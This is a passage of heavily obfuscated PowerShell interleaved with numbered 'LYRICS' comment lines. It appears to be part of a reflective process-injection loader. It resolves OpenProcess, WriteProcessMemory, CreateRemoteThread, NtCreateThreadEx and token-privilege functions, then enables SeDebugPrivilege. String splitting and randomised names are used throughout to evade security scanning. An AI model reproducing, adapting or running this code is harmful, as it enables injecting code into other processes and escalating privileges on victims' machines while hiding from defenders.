            $VAR0065 =  &  ("{0}{1}" -f'FU','N011') @($VAR095, [UIntPtr], [UInt32] ) ( [Bool] )
            $VAR0066 =  $VAR099::$VAR096( $VAR0064, $VAR0065 )
# LYRICS236
# LYRICS237
            $VAR0042 |  &  (  "{2}{1}{0}"-f'ber','dd-Mem','A'  ) (  "{3}{1}{2}{0}" -f'perty','otePr','o','N'  ) -Name ("{0}{1}"-f 'FUN0','38' ) -Value $VAR0066
# LYRICS238
            $VAR0067 =  &  ( "{0}{1}{2}" -f 'FUN','01','2' ) $VAR0302 (  "{0}{3}{2}{1}"-f'Virtu','x','FreeE','al' )
# LYRICS239
            $VAR0068   =    &  (  "{2}{1}{0}" -f'1','UN01','F' ) @($VAR095, $VAR095, [UIntPtr], [UInt32]) ( [Bool])
            $VAR0069  =  $VAR099::$VAR096( $VAR0067, $VAR0068  )
# LYRICS240
            $VAR0042 |  & ("{1}{0}{2}" -f'd','Ad','-Member') ( "{1}{0}{2}" -f 'eProp','Not','erty') -Name (  "{0}{1}"-f'FUN03','9') -Value $VAR0069
# LYRICS241
            $VAR0070  =  &("{1}{2}{0}" -f '2','FUN','01' ) $VAR0302 ( "{1}{2}{0}"-f'lProtect','Virtu','a')
# LYRICS242
            $VAR0071  = & ("{0}{1}{2}" -f'FUN','0','11' ) @($VAR095, [UIntPtr], [UInt32],  (     & ("{0}{1}" -f'd','ir')  vARiable:xdYu  ).VALue.("{0}{2}{1}{3}"-f'MakeBy','f','Re','Type'  ).Invoke(   )) ( [Bool]  )
# LYRICS243
            $VAR0072 = $VAR099::$VAR096( $VAR0070, $VAR0071  )
            $VAR0042   | &( "{1}{0}{2}"-f'd','A','d-Member' ) ("{1}{0}{3}{2}"-f 'P','Note','rty','rope' ) -Name ("{1}{2}{0}"-f '40','F','UN0') -Value $VAR0072
# LYRICS244
            $VAR0073 =  &  ( "{1}{0}{2}"-f '0','FUN','12'  ) $VAR0302 ("{2}{3}{0}{1}"-f 'duleHandle','A','Get','Mo'  )
# LYRICS245
            $VAR0074  =  & (  "{1}{0}"-f'11','FUN0' ) @([String]  ) (  $VAR095)
# LYRICS246
            $VAR0075   =  $VAR099::$VAR096(  $VAR0073, $VAR0074)
            $VAR0042 |  & (  "{0}{2}{1}" -f'Add-M','mber','e' ) (  "{1}{0}{2}"-f'rope','NoteP','rty'  ) -Name ("{0}{1}" -f 'FUN0','41') -Value $VAR0075
# LYRICS247
            $VAR0076   =     &("{2}{1}{0}" -f '2','1','FUN0' ) $VAR0302 ("{1}{3}{2}{0}"-f 'rary','Fre','Lib','e' )
# LYRICS248
            $VAR0077  =     &  ( "{1}{0}" -f '11','FUN0' ) @($VAR095 ) ([Bool] )
            $VAR0078  =  $VAR099::$VAR096(  $VAR0076, $VAR0077  )
            $VAR0042 |   &( "{0}{2}{1}"-f 'Add-Memb','r','e'  ) -MemberType ("{2}{1}{0}" -f 'rty','rope','NoteP'  ) -Name (  "{0}{1}"-f'FUN','042') -Value $VAR0078
# LYRICS249
            $VAR0079   =    & ("{1}{0}" -f 'UN012','F' ) $VAR0302 (  "{1}{2}{0}" -f 's','Ope','nProces')
# LYRICS250
            $VAR0080  =  &("{0}{2}{1}"-f 'F','11','UN0' ) @([UInt32], [Bool], [UInt32]) (  $VAR095 )
            $VAR0081 = $VAR099::$VAR096($VAR0079, $VAR0080 )
# LYRICS251
            $VAR0042   |   &  (  "{0}{2}{1}"-f 'Add-','mber','Me' ) -MemberType (  "{1}{0}{2}{3}" -f 'ePrope','Not','rt','y' ) -Name ("{1}{2}{0}" -f'43','FUN','0'  ) -Value $VAR0081
# LYRICS252
            $VAR0082   =    & (  "{2}{0}{1}"-f 'U','N012','F') $VAR0302 ( "{2}{1}{3}{0}{4}" -f'jec','g','WaitForSin','leOb','t'  )
            $VAR0083   =  &(  "{0}{1}{2}" -f 'F','UN','011'  ) @($VAR095, [UInt32] ) (  [UInt32] )
            $VAR0084 =   $VAR099::$VAR096( $VAR0082, $VAR0083 )
# LYRICS253
            $VAR0042  | &("{1}{3}{0}{2}"-f'mbe','Add-','r','Me'  ) -MemberType ( "{0}{1}{3}{2}" -f'NoteP','rope','y','rt') -Name ("{0}{1}" -f'FUN04','4' ) -Value $VAR0084
# LYRICS254
            $VAR0085  =    &( "{0}{1}" -f 'FU','N012' ) $VAR0302 ( "{0}{3}{2}{1}"-f'Wr','mory','eProcessMe','it'  )
            $VAR0086  =    &  ( "{0}{1}" -f 'FUN','011'  ) @($VAR095, $VAR095, $VAR095, [UIntPtr],   (    &  ( "{1}{0}"-f'Tem','GeT-i' )  ("vARIA"  +"b"  + "le"+":321iU" )  ).ValUe.("{0}{2}{1}"-f 'Ma','yRefType','keB').Invoke( )  ) ( [Bool] )
# LYRICS255
            $VAR0087   = $VAR099::$VAR096( $VAR0085, $VAR0086  )
# LYRICS256
            $VAR0042   | & (  "{0}{2}{1}"-f 'A','Member','dd-' ) -MemberType ( "{2}{0}{1}" -f 'pe','rty','NotePro'  ) -Name ("{1}{2}{0}"-f '45','FU','N0' ) -Value $VAR0087
# LYRICS257
            $VAR0088  =  &  (  "{0}{1}" -f 'F','UN012'  ) $VAR0302 (  "{3}{4}{0}{1}{2}" -f 'ro','cessM','emory','Read','P' )
# LYRICS258
            $VAR0089 =    &  (  "{1}{0}"-f '1','FUN01'  ) @($VAR095, $VAR095, $VAR095, [UIntPtr],  $321IU.("{1}{0}{3}{2}"-f 'ke','Ma','Type','ByRef').Invoke(    )  ) (  [Bool] )
            $VAR0090 =   $VAR099::$VAR096( $VAR0088, $VAR0089  )
# LYRICS259
            $VAR0042  |   &("{1}{0}{2}" -f 'd-Membe','Ad','r') -MemberType (  "{0}{1}{3}{2}" -f 'N','otePr','erty','op') -Name ( "{0}{1}" -f'FUN0','46'  ) -Value $VAR0090
# LYRICS260
            $VAR0091   =    &(  "{1}{0}" -f'N012','FU') $VAR0302 ( "{4}{0}{3}{1}{2}" -f'reateRemoteT','r','ead','h','C' )
# LYRICS261
            $VAR0092  =     &  ( "{2}{0}{1}" -f'0','11','FUN') @($VAR095, $VAR095, [UIntPtr], $VAR095, $VAR095, [UInt32], $VAR095 ) (  $VAR095)
            $VAR0093 =  $VAR099::$VAR096($VAR0091, $VAR0092 )
# LYRICS262
            $VAR0042  | &( "{0}{2}{1}"-f'Ad','ember','d-M' ) -MemberType ("{1}{0}{2}{3}"-f'Pr','Note','op','erty' ) -Name ( "{0}{1}" -f'FUN','047') -Value $VAR0093
# LYRICS263
            $VAR0094 =   &( "{1}{0}" -f'12','FUN0') $VAR0302 ( "{0}{1}{2}{3}"-f'Ge','tE','xitCo','deThread')
# LYRICS264
# LYRICS265
            $VAR0095   =    &( "{1}{0}{2}"-f'UN','F','011') @($VAR095,  (  &  (  "{0}{2}{1}" -f 'vARi','e','AbL'  ) ("5W"  + "g" )  ).VAlUE.( "{3}{1}{0}{2}"-f 'p','efTy','e','MakeByR').Invoke( )) ( [Bool] )
# LYRICS266
            $VAR0096   = $VAR099::$VAR096($VAR0094, $VAR0095)
            $VAR0042  |   &  (  "{1}{2}{0}"-f'r','Add-Mem','be') -MemberType ( "{2}{3}{0}{1}" -f 'per','ty','NoteP','ro'  ) -Name ( "{1}{0}" -f'UN048','F' ) -Value $VAR0096
# LYRICS267
            $VAR0097   = &  ("{1}{0}"-f'2','FUN01' ) $VAR0306 ( "{0}{4}{3}{2}{1}"-f 'Op','en','Tok','ead','enThr'  )
# LYRICS268
            $VAR0098   =   &  ("{0}{1}" -f 'FUN','011') @($VAR095, [UInt32], [Bool], $VAR095.( "{3}{1}{0}{2}"-f 'yRefTyp','akeB','e','M').Invoke(   )  ) ([Bool]  )
            $VAR0099  =   $VAR099::$VAR096( $VAR0097, $VAR0098  )
            $VAR0042 |   &(  "{1}{2}{0}"-f 'Member','Add','-' ) -MemberType ( "{1}{2}{0}"-f 'perty','N','otePro') -Name (  "{0}{1}" -f'F','UN049'  ) -Value $VAR0099
# LYRICS269
            $VAR0100  =  &  ("{1}{2}{0}" -f '12','FUN','0'  ) $VAR0302 ("{4}{2}{0}{1}{3}" -f 'C','ur','et','rentThread','G' )
# LYRICS270
            $VAR0101 =     &  ( "{0}{2}{1}" -f'FUN','11','0' ) @() ( $VAR095)
# LYRICS271
            $VAR0102  =  $VAR099::$VAR096(  $VAR0100, $VAR0101 )
            $VAR0042 |   & ( "{2}{1}{0}"-f 'd-Member','d','A'  ) -MemberType (  "{2}{1}{0}" -f 'perty','ro','NoteP') -Name ("{1}{0}" -f'050','FUN'  ) -Value $VAR0102
# LYRICS272
            $VAR0103 =     &  (  "{0}{1}{2}"-f 'FUN','01','2' ) $VAR0306 (  "{4}{0}{1}{3}{2}" -f 'd','justTo','s','kenPrivilege','A' )
# LYRICS273
            $VAR0104   =   &  ( "{1}{0}"-f'011','FUN' ) @($VAR095, [Bool], $VAR095, [UInt32], $VAR095, $VAR095  ) (  [Bool]  )
            $VAR0105 =  $VAR099::$VAR096(  $VAR0103, $VAR0104  )
            $VAR0042 |     & (  "{0}{1}{3}{2}"-f'Add-','M','er','emb' ) -MemberType (  "{0}{1}{2}{3}" -f'Note','Pr','opert','y'  ) -Name (  "{1}{0}" -f'UN051','F'  ) -Value $VAR0105
# LYRICS274
            $VAR0106 =     & ("{2}{0}{1}"-f'1','2','FUN0' ) $VAR0306 ("{0}{3}{2}{5}{1}{4}"-f'LookupPr','l','lege','ivi','ueA','Va')
# LYRICS275
            $VAR0107 =   & ( "{0}{2}{1}"-f 'FUN','1','01') @([String], [String], $VAR095 ) (  [Bool] )
# LYRICS276
            $VAR0108  = $VAR099::$VAR096( $VAR0106, $VAR0107)
# LYRICS277
            $VAR0042  |    &(  "{2}{0}{1}"-f 'e','mber','Add-M') -MemberType (  "{0}{2}{1}" -f'NoteProper','y','t' ) -Name ("{0}{1}" -f 'FUN','052') -Value $VAR0108
# LYRICS278
            $VAR0109   =   &  ("{0}{1}" -f'F','UN012' ) $VAR0306 (  "{3}{0}{1}{2}" -f'son','ate','Self','Imper'  )
            $VAR0110 = &  (  "{0}{1}" -f'FUN01','1'  ) @([Int32]) (  [Bool])
# LYRICS279
            $VAR0111   =  $VAR099::$VAR096($VAR0109, $VAR0110)
# LYRICS280
            $VAR0042  |  & (  "{1}{0}{2}" -f'Me','Add-','mber' ) -MemberType ("{3}{0}{1}{2}"-f'e','Pr','operty','Not'  ) -Name ("{0}{1}"-f'FUN','053') -Value $VAR0111
# LYRICS281
# LYRICS282
            if ( (   (& ('gi'  ) VaRiablE:5230 ).vaLue::"OS`VERS`ioN"."ve`RSiOn" -ge (&(  "{0}{1}{3}{2}"-f'New','-','ject','Ob'  ) ( "{1}{0}" -f 'sion','Ver') 6, 0  )  ) -and (   (   & (  "{2}{1}{0}" -f'Le','rIaB','va'  ) ( '52' +'30')  -VAl  )::"OSv`ER`Sion"."V`eRSion" -lt ( &(  "{1}{0}{3}{2}"-f '-','New','bject','O') ( "{0}{2}{1}" -f'V','on','ersi'  ) 6, 2 )  ) ) {
# LYRICS283
                $VAR0112  =   &  ("{1}{0}" -f'012','FUN') ("{2}{0}{1}{3}" -f 'Dl','l','Nt','.dll'  ) ("{3}{1}{0}{2}" -f 'h','ateT','readEx','NtCre')
# LYRICS284
                $VAR0113 =   & (  "{2}{1}{0}" -f'011','UN','F'  ) @($VAR095.( "{3}{2}{1}{0}{4}" -f'p','Ty','f','MakeByRe','e').Invoke(    ), [UInt32], $VAR095, $VAR095, $VAR095, $VAR095, [Bool], [UInt32], [UInt32], [UInt32], $VAR095 ) ( [UInt32]  )
                $VAR0114 = $VAR099::$VAR096(  $VAR0112, $VAR0113)
# LYRICS285
                $VAR0042   |  &  (  "{0}{2}{1}" -f 'A','d-Member','d' ) -MemberType ( "{0}{1}{2}" -f 'Not','eProp','erty') -Name (  "{1}{0}"-f 'N054','FU' ) -Value $VAR0114
            }
# LYRICS286
            $VAR0115  =  & (  "{0}{2}{1}" -f 'F','012','UN'  ) $VAR0302 ( "{2}{0}{3}{1}" -f 'Wo','rocess','Is','w64P'  )
# LYRICS287
            $VAR0116 =    & (  "{1}{0}"-f 'N011','FU'  ) @($VAR095,   $JxB5vO.( "{0}{1}{2}{3}" -f 'M','ake','ByRef','Type'  ).Invoke(   )) ([Bool])
            $VAR0117   =   $VAR099::$VAR096(  $VAR0115, $VAR0116 )
# LYRICS288
            $VAR0042   |  &  ( "{1}{0}{2}" -f 'e','Add-Memb','r'  ) -MemberType (  "{0}{1}{2}"-f'NotePro','p','erty'  ) -Name (  "{1}{2}{0}" -f '5','FUN','05') -Value $VAR0117
# LYRICS289
            $VAR0118 =  &  ("{0}{1}"-f'FU','N012') $VAR0302 (  "{2}{0}{1}" -f 'ateThre','ad','Cre' )
# LYRICS290
            $VAR0119  =    & (  "{0}{2}{1}" -f'F','1','UN01'  ) @($VAR095, $VAR095, $VAR095, $VAR095, [UInt32],   (    &("{0}{1}{2}"-f 'ge','t-','childITEM'  ) (  'VARiab' + 'l' +  'e:xDYU')    ).vaLue.("{1}{0}{2}"-f 'keByRefT','Ma','ype'  ).Invoke(   )  ) (  $VAR095  )
# LYRICS291
            $VAR0120 =  $VAR099::$VAR096( $VAR0118, $VAR0119)
            $VAR0042  |   &  (  "{2}{0}{1}"-f '-Memb','er','Add' ) -MemberType (  "{1}{3}{0}{2}"-f 'r','NoteProp','ty','e' ) -Name ( "{0}{1}" -f'FUN05','6'  ) -Value $VAR0120
# LYRICS292
            return $VAR0042
        }
# LYRICS293
# LYRICS294
# LYRICS295
# LYRICS296
        Function F`Un004 {
# LYRICS297
# LYRICS298
            Param( 
                [Parameter( pOSition   =  0, mANdaTOrY =   $true )]
                [Int64]
                $VAR0121,
# LYRICS299
                [Parameter(  POSiTIOn =  1, MANDatoRy =  $true  )]
                [Int64]
                $VAR0122
            )
# LYRICS300
            [Byte[]]$VAR0121Bytes =    (   &  ("{1}{2}{0}" -f 'Le','gET-varIA','b'  )  ( 'i' + 'Gt' )).vALue::( "{1}{0}{2}"-f 'te','GetBy','s').Invoke( $VAR0121  )
            [Byte[]]$VAR0122Bytes =   $IGT::("{0}{2}{1}"-f 'Ge','tes','tBy').Invoke($VAR0122  )
# LYRICS301
            [Byte[]]$VAR0123  =     (  &  ("{0}{1}" -f'VARIab','lE'  )  IGt ).valuE::"get`ByTES"([UInt64]0 )
# LYRICS302
            if (  $VAR0121Bytes."COu`Nt" -eq $VAR0122Bytes."c`oUnt"  ) {
                $VAR0124  =  0
# LYRICS303
                for ($i = 0 ; $i -lt $VAR0121Bytes."C`ount" ;  $i++) {
# LYRICS304
# LYRICS305
                    $Val   = $VAR0121Bytes[$i] - $VAR0124
# LYRICS306
                    if (  $Val -lt $VAR0122Bytes[$i] ) {
                        $Val += 256
# LYRICS307
                        $VAR0124   =  1
                    }
                    else {
# LYRICS308
                        $VAR0124   = 0
                    }
# LYRICS309
# LYRICS310
                    [UInt16]$Sum   =   $Val - $VAR0122Bytes[$i]
# LYRICS311
                    $VAR0123[$i] =   $Sum -band 0x00FF
# LYRICS312
                }
            }
            else {
                Throw ("{1}{0}"-f 'RROR01','E' )
            }
# LYRICS313
            return   (   &(  "{1}{0}{2}" -f 'T','GET-I','EM') VariAblE:iGT  ).vALUE::(  "{1}{0}{2}" -f'Int6','To','4'  ).Invoke($VAR0123, 0)
        }
# LYRICS314
        Function f`Un005 {
# LYRICS315
            Param(  
                [Parameter( pOSItiON  =  0, mANDAToRy   =   $true  )]
                [Int64]
                $VAR0121,
# LYRICS316
                [Parameter(  POsItiON   = 1, mANdaTorY  =   $true )]
                [Int64]
                $VAR0122
            )
# LYRICS317
            [Byte[]]$VAR0121Bytes   =   (    &(  "{0}{1}"-f 'D','iR'  ) ("vArI" +  "aBlE:ig"  +"T") ).vaLUe::(  "{2}{0}{1}" -f 'tByte','s','Ge').Invoke( $VAR0121  )
# LYRICS318
            [Byte[]]$VAR0122Bytes   =  $igT::(  "{1}{2}{0}" -f'tes','Ge','tBy'  ).Invoke( $VAR0122 )
            [Byte[]]$VAR0123  =  $igT::"GeT`B`YtES"([UInt64]0  )
# LYRICS319
            if (  $VAR0121Bytes."cO`UnT" -eq $VAR0122Bytes."CoU`NT"  ) {
# LYRICS320
                $VAR0124  =   0
                for ($i  =   0  ; $i -lt $VAR0121Bytes."cO`UNT" ;   $i++) {
# LYRICS321
# LYRICS322
                    [UInt16]$Sum =   $VAR0121Bytes[$i]  + $VAR0122Bytes[$i] + $VAR0124
# LYRICS323
                    $VAR0123[$i]  =  $Sum -band 0x00FF
# LYRICS324
                    if ((  $Sum -band 0xFF00) -eq 0x100  ) {
# LYRICS325
                        $VAR0124 = 1
                    }
                    else {
# LYRICS326
                        $VAR0124   = 0
                    }
                }
            }
            else {
                Throw ( "{0}{1}"-f'ER','ROR02'  )
            }
# LYRICS327
            return  (      & ( "{1}{2}{0}" -f 'LE','vaRI','aB') IGT  ).VAlue::(  "{1}{2}{0}"-f 'nt64','To','I'  ).Invoke(  $VAR0123, 0 )
        }
# LYRICS328
        Function f`UN006 {
# LYRICS329
            Param(  
                [Parameter(  poSITIOn =  0, MANDaToRy   = $true  )]
                [Int64]
                $VAR0121,
# LYRICS330
                [Parameter(pOSItiON  =   1, MandAToRY  = $true )]
                [Int64]
                $VAR0122
              )
# LYRICS331
            [Byte[]]$VAR0121Bytes   =  (   &("{0}{2}{1}"-f'VAR','ABlE','i' ) iGt  -Va )::(  "{1}{0}"-f 'Bytes','Get' ).Invoke($VAR0121)
# LYRICS332
            [Byte[]]$VAR0122Bytes   =   (  &( "{0}{1}"-f 'I','tEM' )  VariablE:iGt  ).VALUe::(  "{0}{2}{1}"-f'GetBy','es','t'  ).Invoke( $VAR0122)
# LYRICS333
            if (  $VAR0121Bytes."CoU`Nt" -eq $VAR0122Bytes."Cou`NT") {
                for (  $i =  $VAR0121Bytes."C`OUnt" - 1 ; $i -ge 0 ;   $i--) {
# LYRICS334
                    if ( $VAR0121Bytes[$i] -gt $VAR0122Bytes[$i] ) {
# LYRICS335
                        return $true
                    }
                    elseif ( $VAR0121Bytes[$i] -lt $VAR0122Bytes[$i] ) {
# LYRICS336
                        return $false
                    }
                }
            }
            else {
                Throw (  "{0}{2}{1}"-f 'E','R03','RRO' )
            }
# LYRICS337
            return $false
        }
# LYRICS338
# LYRICS339
        Function Fu`N007 {
            Param(  
                [Parameter(  pOsItIOn  =   0, MandatORy   =  $true )]
                [UInt64]
# LYRICS340
                $VAR0123
              )
# LYRICS341
            [Byte[]]$VAR0123Bytes  =    (   &(  "{0}{1}"-f 'V','aRiABLE' ) ( "Ig"+ "t"  )  -ValuEONl  )::( "{0}{1}" -f'Ge','tBytes'  ).Invoke($VAR0123  )
# LYRICS342
            return (   (   & (  "{0}{2}{1}"-f 'gEt-v','blE','ArIa'  ) Igt  ).valUE::(  "{0}{1}" -f 'ToI','nt64' ).Invoke(  $VAR0123Bytes, 0))
        }
# LYRICS343
# LYRICS344
        Function f`U`N008 {
# LYRICS345
            Param(  
                [Parameter( PosITIoN =  0, manDAToRY  =  $true  )]
                $VAR0123 
              )
# LYRICS346
            $VAR0123Size  =   $VAR099::"siZ`e`OF"( [Type]$VAR0123.(  "{1}{0}{2}"-f 't','Ge','Type' ).Invoke( ) ) * 2
# LYRICS347
            $VAR0124  =  "0x{0:X$($VAR0123Size)}" -f [Int64]$VAR0123 
# LYRICS348
            return $VAR0124
        }
# LYRICS349
        Function Fun009 {
# LYRICS350
            Param(
                [Parameter(poSitIOn =   0, mANDAToRy  =   $true)]
                [String]
                $VAR0125,
# LYRICS351
                [Parameter( Position =  1, MaNDATory   =  $true  )]
                [System.Object]
                $VAR0126,
# LYRICS352
                [Parameter( posITION  =   2, mANDATOry  =   $true)]
                [IntPtr]
                $VAR0127,
# LYRICS353
                [Parameter(PARaMEtERSETNAmE = "sI`ze", pOSitiON   = 3, maNDaTOry = $true )]
                [IntPtr]
                $Size
            )
# LYRICS354
            [IntPtr]$VAR0128 =  [IntPtr](  &( "{2}{1}{0}" -f '05','N0','FU') ( $VAR0127  ) ($Size ) )
# LYRICS355
# LYRICS356
            $VAR0128 = $VAR0126."c`ONs`T038"
# LYRICS357
# LYRICS358
        }
# LYRICS359
        Function fu`N010 {
# LYRICS360
            Param(
                [Parameter(pOSITIoN  =   0, mAnDatORY =  $true)]
                [Byte[]]
                $Bytes,
# LYRICS361
                [Parameter( pOSition  = 1, ManDAToRy   = $true)]
                [IntPtr]
                $VAR0129
             )
# LYRICS362
            for ( $VAR0130  =   0 ;  $VAR0130 -lt $Bytes."lEng`Th"  ; $VAR0130++  ) {
# LYRICS363
                $VAR099::"WR`i`Te`BYTE"( $VAR0129, $VAR0130, $Bytes[$VAR0130]  )
            }
        }
# LYRICS364
# LYRICS365
        Function FUn0`11 {
# LYRICS366
            Param
            ( 
                [OutputType(  [Type])]
# LYRICS367
                [Parameter(  PoSitIoN =  0 )]
                [Type[]]
                $Parameters  =  ( &("{3}{2}{0}{1}" -f '-Ob','ject','w','Ne') ("{1}{0}"-f'[]','Type')(0) ),
# LYRICS368
                [Parameter(  poSiTiOn   = 1 )]
                [Type]
                $ReturnType   =  [Void]
             )
# LYRICS369
            $Domain =     $d9m0Qn::"c`U`RRENTdO`MA`IN"
            $VAR0131  =    &( "{1}{0}{2}" -f '-Obje','New','ct') ("{4}{1}{7}{0}{6}{2}{5}{3}" -f'.Assem','.','ly','me','System','Na','b','Reflection' )( ("{3}{4}{0}{2}{5}{1}" -f 't','elegate','e','Refl','ec','dD')  )
# LYRICS370
            $VAR013   = $Domain."def`ine`D`Y`NAM`iCaSseMb`LY"(  $VAR0131,  (     & ( "{1}{0}{2}" -f 'iAb','VaR','lE' ) (  "6kjf"  +"h"  )   ).VALue::"r`UN" )
            $VAR014 = $VAR013.(  "{1}{3}{2}{0}"-f'ule','D','od','efineDynamicM' ).Invoke(  (  "{3}{0}{2}{1}"-f'yMod','le','u','InMemor'), $false)
            $VAR011  =  $VAR014.( "{2}{0}{1}"-f'ef','ineType','D' ).Invoke(( "{0}{1}{2}{3}"-f'MyD','ele','ga','teType'  ), (  "{6}{3}{1}{7}{0}{5}{2}{4}"-f ', ','nsiCla','s',', Sealed, A','s','AutoCla','Class, Public','ss'  ), [System.MulticastDelegate]  )
# LYRICS371
            $VAR0132 =   $VAR011.(  "{2}{1}{3}{0}"-f'r','str','DefineCon','ucto'  ).Invoke(  ("{3}{4}{2}{0}{1}{5}"-f 'cialName, Hide','B','Spe','R','T','ySig, Public'),   (      & ('lS') VAriaBlE:u5e ).vAlue::"StaNd`A`Rd", $Parameters)
            $VAR0132.("{0}{2}{4}{3}{5}{1}"-f 'SetImpl','gs','em','onFl','entati','a'  ).Invoke((  "{1}{0}{4}{2}{3}"-f 't','Run',', Manage','d','ime')  )
# LYRICS372
            $VAR0133   = $VAR011.("{2}{1}{0}"-f 'fineMethod','e','D'  ).Invoke('Invoke', ( "{5}{7}{1}{4}{3}{0}{8}{2}{6}" -f'ig, Ne',' H','Slot, V','yS','ideB','Pub','irtual','lic,','w' ), $ReturnType, $Parameters  )
# LYRICS373
            $VAR0133.(  "{3}{0}{4}{5}{6}{1}{2}"-f 'tI','t','ationFlags','Se','mpl','e','men').Invoke(("{2}{0}{1}" -f 'anage','d','Runtime, M'  ))
# LYRICS374
              &  ( "{1}{0}{2}{3}"-f'te-Ou','Wri','tp','ut'  ) $VAR011.(  "{2}{0}{1}" -f'yp','e','CreateT'  ).Invoke(  )
        }
# LYRICS375
# LYRICS376
# LYRICS377
        Function FuN012 {
# LYRICS378
            Param
            ( 
                [OutputType([IntPtr])]
# LYRICS379
                [Parameter(   POSITIOn  =  0, MANdatorY = $True   )]
                [String]
                $Module,
# LYRICS380
                [Parameter(   POSitiOn  =   1, mAnDAtOry   =   $True  )]
                [String]
                $VAR0139
            )
# LYRICS381
# LYRICS382
            $VAR0134 =    (   & (  "{1}{0}{2}" -f'ldit','cHi','Em')  (  'VA'+'riabLe' +':d9M0Q'+'N')   ).Value::"curren`TD`O`m`AIN".(  "{1}{2}{0}" -f's','Get','Assemblie').Invoke(  )   |  
             & ("{0}{3}{1}{2}"-f 'Where-Ob','e','ct','j'  ) { $_."GloB`Ala`SS`e`mBLYCA`Che" -And $_."LOc`A`TION".( "{0}{1}" -f'S','plit' ).Invoke( '\\')[-1].(  "{0}{1}"-f'Eq','uals').Invoke((  "{0}{1}{2}" -f 'Sys','te','m.dll' )) }
# LYRICS383
            $VAR0135  =   $VAR0134.("{1}{2}{0}"-f'pe','Ge','tTy'  ).Invoke( (  "{1}{4}{3}{0}{6}{5}{2}"-f 'ative','Microsoft.Win32.U','s','N','nsafe','ethod','M'))
# LYRICS384
# LYRICS385
            $VAR0075  =   $VAR0135.( "{1}{3}{0}{2}" -f'th','G','od','etMe'  ).Invoke( (  "{1}{0}{2}" -f 'etModuleHandl','G','e' ))
# LYRICS386
            $VAR0060 =  $VAR0135.( "{1}{2}{0}{3}"-f'ethod','Get','M','s'  ).Invoke(   )   |   & ( "{1}{0}" -f 'ere','Wh'  ) { $_."n`AMe" -eq $VAR0312 }  |    & (  "{0}{2}{1}" -f'S','ect','elect-Obj' ) -first 1
# LYRICS387
# LYRICS388
            $VAR0136   =   $VAR0075."iN`Vo`kE"(  $null, @($Module) )
# LYRICS389
# LYRICS390
            try {
                $VAR0137   =   &  (  "{0}{1}{2}"-f 'Ne','w-O','bject' ) ("{0}{1}"-f 'IntP','tr')
                $VAR0138  =   & ("{3}{0}{2}{1}"-f'-O','ect','bj','New'  ) (  "{0}{3}{6}{7}{4}{2}{1}{5}{8}" -f 'S','r','teropSe','ystem.','me.In','vices.HandleR','Runt','i','ef')(  $VAR0137, $VAR0136  )
# LYRICS391
                  &(  "{1}{3}{0}{2}" -f'e-','W','Output','rit'  ) $VAR0060."Inv`oKE"(  $null, @([System.Runtime.InteropServices.HandleRef]$VAR0138, $VAR0139) )
            }
            catch {
# LYRICS392
                  & ( "{0}{3}{2}{1}"-f'W','ut','Outp','rite-'  ) $VAR0060."i`N`Voke"( $null, @($VAR0136, $VAR0139  ))
# LYRICS393
            }
        }
# LYRICS394
        Function fU`N013 {
# LYRICS395
            Param( 
                [Parameter(  POsitIon   = 1, maNdatoRy   =  $true)]
                [System.Object]
                $VAR0042,
# LYRICS396
                [Parameter(pOsiTION  =  2, maNdatoRY =  $true)]
                [System.Object]
                $VAR010,
# LYRICS397
                [Parameter(pOSItion   = 3, MANdAtoRy  =  $true)]
                [System.Object]
                $VAR0041
             )
# LYRICS398
            [IntPtr]$VAR0141   =  $VAR0042."f`UN050"."INVo`Ke"( )
# LYRICS399
            if (  $VAR0141 -eq $VAR095::"z`ERo"  ) {
# LYRICS400
                Throw ("{0}{1}" -f 'ERROR0','3' )
            }
# LYRICS401
            [IntPtr]$VAR0142  = $VAR095::"Z`eRo"
# LYRICS402
            [Bool]$VAR0144   = $VAR0042."FU`N049"."iN`Vo`Ke"(  $VAR0141, $VAR0041."CO`Nst0`26" -bor $VAR0041."coN`st0`27", $false, [Ref]$VAR0142)
# LYRICS403
            if ($VAR0144 -eq $false) {
                $VAR0148   =   $VAR099::( "{3}{2}{5}{0}{1}{4}" -f 'in','32Er','tLa','Ge','ror','stW'  ).Invoke()
# LYRICS404
                if ($VAR0148 -eq $VAR0041."C`OnS`T029" ) {
# LYRICS405
                    $VAR0144  = $VAR0042."fuN0`53"."INv`okE"(  3  )
# LYRICS406
                    if ( $VAR0144 -eq $false) {
                        Throw ( "{1}{0}" -f '04','ERROR'  )
                    }
# LYRICS407
                    $VAR0144   =  $VAR0042."fU`N049"."inV`oke"( $VAR0141, $VAR0041."C`Ons`T026" -bor $VAR0041."c`onst0`27", $false, [Ref]$VAR0142)
# LYRICS408
                    if (  $VAR0144 -eq $false) {
                        Throw ("{0}{1}" -f 'ERR','OR05')
                    }
                }
                else {
                    Throw ('ERRO' + 'R06: '  + "$VAR0148")
                }
            }
# LYRICS409
            [IntPtr]$VAR0143   =  $VAR099::"al`LOCHg`lob`AL"(  $VAR099::"s`IzE`of"(  [Type]$VAR010."c`onsT1`63" )  )
# LYRICS410
            $VAR0144   =   $VAR0042."FU`N052"."I`NVOKE"(  $null, ("{1}{4}{3}{0}{2}" -f'ri','SeDe','vilege','P','bug'), $VAR0143  )
# LYRICS411
            if ( $VAR0144 -eq $false  ) {
                Throw ("{2}{0}{1}" -f'OR','07','ERR' )
            }
# LYRICS412
            [UInt32]$VAR0145   = $VAR099::"SI`ZEoF"(  [Type]$VAR010."co`N`ST167"  )
# LYRICS413
            [IntPtr]$VAR0146 =   $VAR099::(  "{3}{1}{0}{2}" -f 'HGl','lloc','obal','A' ).Invoke(  $VAR0145 )
            $VAR0147   =   $VAR099::"p`TRtOs`TR`UCTurE"(  $VAR0146, [Type]$VAR010."Cons`T1`67" )
# LYRICS414
            $VAR0147."cOns`T`168"   =   1
            $VAR0147."CoN`s`T169"."C`oNST`163"  = $VAR099::"p`TrtO`sTru`c`TurE"(  $VAR0143, [Type]$VAR010."coN`sT`163"  )
# LYRICS415
            $VAR0147."CONS`T`169"."aTT`Rib`UtEs" =  $VAR0041."c`ONsT028"
# LYRICS416
            $VAR099::("{0}{1}{2}" -f 'Stru','c','tureToPtr').Invoke($VAR0147, $VAR0146, $true  )
# LYRICS417
            $VAR0144   =  $VAR0042."FU`N051"."I`NVO`Ke"(  $VAR0142, $false, $VAR0146, $VAR0145, $VAR095::"ZE`Ro", $VAR095::"Z`ero")
# LYRICS418
            $VAR0148 =   $VAR099::( "{2}{3}{0}{1}"-f 's','tWin32Error','G','etLa'  ).Invoke() 
# LYRICS419
# LYRICS420
            if (  ( $VAR0144 -eq $false) -or ($VAR0148 -ne 0)) {
# LYRICS421
